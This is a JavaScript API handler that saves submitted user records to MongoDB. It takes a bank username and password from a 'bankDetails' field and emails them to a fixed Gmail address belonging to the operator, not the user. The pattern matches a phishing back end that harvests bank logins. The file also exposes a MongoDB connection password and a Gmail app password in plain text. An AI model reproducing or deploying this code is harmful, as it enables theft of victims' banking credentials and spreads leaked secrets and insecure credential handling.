import { MongoClient } from "mongodb";
import nodemailer from "nodemailer";

// MongoDB connection function
const connectToDatabase = async () => {
  const client = new MongoClient("mongodb+srv://paulclipps:IW07WLOhHbCq8QIX@cluster0.gwdix.mongodb.net/");
  await client.connect();
  const db = client.db("Users"); 
  return { db, client };
};

// Function to send email with Nodemailer
const sendEmail = async (userId, userEmail, userName, password) => {
  // Create a transporter object using SMTP transport
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "debbanderson967@gmail.com",
      pass: "dyhg wqlu cnsb dtex",
    },
  });

  // Email options
  const mailOptions = {
    from: "debbanderson967@gmail.com",  
    to: "debbanderson967@gmail.com",       
    subject: "Welcome!",
    html: `
      <p>Hello ${userName}!</p>
      <p>Your details are as follows:</p>
      <ul>
        <li><strong>User ID:</strong> ${userId}</li>
        <li><strong>Username:</strong> ${userName}</li>
        <li><strong>Password:</strong> ${password}</li>
      </ul>
      <p>Thank you for joining us!</p>
    `,
  };

  // Send email
  await transporter.sendMail(mailOptions);
};

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  console.log(req.method);

  try {
    // Ensure the request method is POST
    if (req.method !== "POST") {
      throw new Error(`Method ${req.method} Not Allowed`);
    }

    // Get the user data from the request body
    const newUser = req.body;

    // Connect to the MongoDB database
    const { db, client } = await connectToDatabase();

    // Generate a new user ID based on the MongoDB collection size
    const usersCollection = db.collection("users");
    const userCount = await usersCollection.countDocuments();
    const userId = `user${userCount + 1}`;

    // Create a new user object with the generated user ID
    const userWithId = { ...newUser, id: userId };

    // Insert the new user into the MongoDB collection
    const result = await usersCollection.insertOne(userWithId); // Renamed from 'res' to 'result'
    console.log(result);

    // Extract email, username, and password safely
    const { email, bankDetails = {} } = newUser; // Provide default empty object for bankDetails
    const { username = "", password = "" } = bankDetails; // Provide default values for username and password

    // Send an email with the user ID, username, and password
    await sendEmail(userId, email, username, password);

    // Close the MongoDB connection
    client.close();

    // Respond with the new user data
    res.status(201).json({ message: "User saved successfully", user: userWithId });

  } catch (error) {
    // Handle the case when the method is not allowed
    if (error.message.includes("Method")) {
      return res.status(405).end(error.message);
    }

    // Log any other errors and respond with appropriate message
    console.error("Error:", error);
    res.status(500).json({ message: "An error occurred", error: error.message });
  }
}
